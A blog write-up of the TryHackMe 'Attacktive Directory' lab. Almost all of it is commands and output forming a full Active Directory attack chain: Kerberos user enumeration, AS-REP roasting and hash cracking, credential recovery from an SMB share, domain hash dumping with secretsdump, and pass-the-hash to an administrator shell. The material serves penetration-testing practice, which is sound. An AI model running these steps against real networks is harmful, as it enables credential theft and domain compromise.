---
title: TryHackMe | Attacktive Directory
author: Zeropio
date: 2022-09-29
categories: [TryHackMe, Rooms]
tags: [thm, windows]
permalink: /tryhackme/attacktive-directory
---

# Foothold

The nmap show:

```
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-09-27 17:56:38Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=AttacktiveDirectory.spookysec.local
| Not valid before: 2022-09-26T17:53:43
|_Not valid after:  2023-03-28T17:53:43
| rdp-ntlm-info: 
|   Target_Name: THM-AD
|   NetBIOS_Domain_Name: THM-AD
|   NetBIOS_Computer_Name: ATTACKTIVEDIREC
|   DNS_Domain_Name: spookysec.local
|   DNS_Computer_Name: AttacktiveDirectory.spookysec.local
|   Product_Version: 10.0.17763
|_  System_Time: 2022-09-27T17:56:54+00:00
|_ssl-date: 2022-09-27T17:57:02+00:00; 0s from scanner time.
```

We will start by enumerating the users in the AD:

```console
zero@pio$ kerbrute userenum userlist.txt --dc 10.10.101.26 -d spookysec.local

	2022/09/27 19:05:34 >  [+] VALID USERNAME:       james@spookysec.local
	2022/09/27 19:05:36 >  [+] VALID USERNAME:       svc-admin@spookysec.local
	2022/09/27 19:05:39 >  [+] VALID USERNAME:       James@spookysec.local
	2022/09/27 19:05:40 >  [+] VALID USERNAME:       robin@spookysec.local
	2022/09/27 19:05:47 >  [+] VALID USERNAME:       darkstar@spookysec.local
	2022/09/27 19:05:52 >  [+] VALID USERNAME:       administrator@spookysec.local
	2022/09/27 19:06:03 >  [+] VALID USERNAME:       backup@spookysec.local
	2022/09/27 19:06:09 >  [+] VALID USERNAME:       paradox@spookysec.local
	2022/09/27 19:06:40 >  [+] VALID USERNAME:       JAMES@spookysec.local
	2022/09/27 19:06:53 >  [+] VALID USERNAME:       Robin@spookysec.local
	2022/09/27 19:08:06 >  [+] VALID USERNAME:       Administrator@spookysec.local
	2022/09/27 19:10:45 >  [+] VALID USERNAME:       Darkstar@spookysec.local
	2022/09/27 19:11:37 >  [+] VALID USERNAME:       Paradox@spookysec.local
```

---

# Fingerprint

As we don’t have creds for any user we can try pulling Kerberos’ ticket with `GetNPUsers.py`:

```console
zero@pio$ GetNPUsers.py spookysec.local/svc-admin -no-pass
```

With the ticket now we can try bruteforcing it to cracked:

```console
zero@pio$ hashcat -m 18200 hash ../exploits/wordlist/passwordlist.txt

	$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:a26846e0ac0550f4789ecda3c3164d04$fc3576ca02e7fe09ade53f6aebff2ebcb18e49fe0b9385f20e1c66612c3cb76d2fc68a9813852a3f7b513723af6eac8f6d2a705f2a4df9adedacff12fff8a305108790df779da1ea77837a8159d3434651384db2aefc89ba4b590400b32034d2d0049e1f2a56c80025a4ca6e86accbdca801ebb7428593cf2be30728a427eaa364d0d2a6c051d19d261b72a0f075d6cf38e6c2e6fc38be91826a88c9dd07a99f891e3c4de93c22b605b957af71ba2958849b16c70b4543274363653b6f1621aca8365fd6e5043790958c4aa034fffa6e2c1dbff35274351fe91eba7375968b4361dbd97ee8df36e835d4dbcd126dcd3dc9b1:management2005
                                                          
	Session..........: hashcat
	Status...........: Cracked
```

We can use these creds to list the smb:

```console
zero@pio$ smbclient -L \\\\10.10.51.28\\ -U spookysec.local/svc-admin               
	Password for [SPOOKYSEC.LOCAL\svc-admin]:
	
	        Sharename       Type      Comment
	        ---------       ----      -------
	        ADMIN$          Disk      Remote Admin
	        backup          Disk      
	        C$              Disk      Default share
	        IPC$            IPC       Remote IPC
	        NETLOGON        Disk      Logon server share 
	        SYSVOL          Disk      Logon server share
```

We found an interesting share, **backup**. From there we can get a file:

```console
zero@pio$ smbclient \\\\10.10.51.28\\backup -U spookysec.local/svc-admin
	Password for [SPOOKYSEC.LOCAL\svc-admin]:
	Try "help" to get a list of possible commands.
	smb: \> ls
	  .                                   D        0  Sat Apr  4 20:08:39 2020
	  ..                                  D        0  Sat Apr  4 20:08:39 2020
	  backup_credentials.txt              A       48  Sat Apr  4 20:08:53 2020
	
	                8247551 blocks of size 4096. 3577282 blocks available
	smb: \> get backup_credentials.txt 
	getting file \backup_credentials.txt of size 48 as backup_credentials.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
```

We found there the string `YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw`. We can decode it from base64:

```console
zero@pio$ echo "YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw" | base64 -d
	backup@spookysec.local:backup2517860
```

Now we can dump all the hashes with these creds:

```console
zero@pio$ secretsdump.py -just-dc backup@spookysec.local

	Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
```

We can use that hash to get the administrator shell:

```console
zero@pio$ evil-winrm -i 10.10.51.28 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc

	*Evil-WinRM* PS C:\Users\Administrator\Documents>
```